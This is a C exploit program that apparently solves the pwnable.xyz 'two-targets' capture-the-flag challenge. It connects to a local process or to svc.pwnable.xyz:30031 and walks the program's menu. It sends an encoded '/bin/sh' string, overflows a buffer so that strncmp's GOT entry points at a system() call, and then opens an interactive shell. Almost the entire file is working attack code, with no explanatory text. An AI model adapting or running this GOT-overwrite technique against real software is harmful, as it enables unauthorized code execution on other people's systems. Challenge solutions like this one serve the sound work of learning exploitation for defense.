#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>

#include <exdev.h>

#ifdef EXPLOIT_LOCAL
#define BINPATH "./two-targets"
#else
#include <netinet/in.h>
#define HOST "svc.pwnable.xyz"
#define PORT 30031
#endif

uint64_t strncmp_got_plt = 0x603018;
uint64_t call_system = 0x4009a7;
/* This string will be decoded by auth() to "/bin/sh" */
char enc_bin_sh[] = "\xa7\xa2\x0e\xb8\x76\x0f\x48\x05";

int main(int argc, char **argv, char **envp){
    char buf[255];
    memset(buf, 0, 255);

#ifdef EXPLOIT_LOCAL
#define TARGET_STDIN p->stdin
#define TARGET_STDOUT p->stdout
#define TARGET_STDERR p->stderr
    PROC *p = NULL;
    char *args[] = {BINPATH, NULL};

    p = process(BINPATH, args, envp, 0);
    if(!p){
        fprintf(stderr, "%s:%d:process(): Failed to spawn process\n", __FILE__, __LINE__);
        return 1;
    }

#else
#define TARGET_STDIN r->sock
#define TARGET_STDOUT r->sock
#define TARGET_STDERR r->sock
    REMOTE *r = NULL;

    r = remote(HOST, PORT, AF_INET, SOCK_STREAM);
    if(!r){
        fprintf(stderr, "%s:%d:remote(): Failed to connect to %s:%hu", __FILE__, __LINE__, HOST, PORT);
        return 1;
    }
#endif
    read(TARGET_STDOUT, buf, 84);
    buf[0] = '1';
    buf[2] = '\n';
    write(TARGET_STDIN, buf, 2);
    read(TARGET_STDOUT, buf, 6);
    memcpy(buf, enc_bin_sh, 8);
    *(buf+8) = '\n';
    write(TARGET_STDIN, buf, 9);
    read(TARGET_STDOUT, buf, 84);
    buf[0] = '2';
    buf[1] = '\n';
    write(TARGET_STDIN, buf, 2);
    read(TARGET_STDOUT, buf, 13);

    memset(buf, 0x41, 16);
    *(uint64_t *)(buf+16) = strncmp_got_plt;
    hexdump((unsigned char *)buf, 24, 4);
    printf("\n");
    write(TARGET_STDIN, buf, 24);
    
    read(TARGET_STDOUT, buf, 84);
    buf[0] = '3';
    buf[1] = '\n';
    write(TARGET_STDIN, buf, 2);
    read(TARGET_STDOUT, buf, 5);
    snprintf(buf, 32, "%d\n", (int)call_system);
    write(TARGET_STDIN, buf, strlen(buf));

    read(TARGET_STDOUT, buf, 84);
    buf[0] = '4';
    buf[1] = '\n';
    write(TARGET_STDIN, buf, 2);
    shell(TARGET_STDIN, TARGET_STDOUT, TARGET_STDERR);

#ifdef EXPLOIT_LOCAL
    reap_process(p);
#elif EXPLOIT_REMOTE
    remote_close(r);
#endif
    return 0;
}